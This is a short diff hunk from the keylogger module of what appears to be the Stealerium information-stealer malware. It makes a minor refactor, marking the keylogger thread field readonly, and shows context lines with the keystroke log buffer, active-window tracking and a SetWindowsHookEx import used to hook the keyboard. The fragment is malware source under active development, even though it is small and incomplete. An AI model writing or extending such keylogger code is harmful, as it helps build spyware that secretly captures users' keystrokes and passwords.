@@ -16,7 +16,7 @@ namespace Stealerium.Modules.Keylogger
         public static bool KeyloggerEnabled = false;
         public static string KeyLogs = "";
         private static string _prevActiveWindowTitle;
-        public static Thread MainThread = new Thread(StartKeylogger);
+        public static readonly Thread MainThread = new Thread(StartKeylogger);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
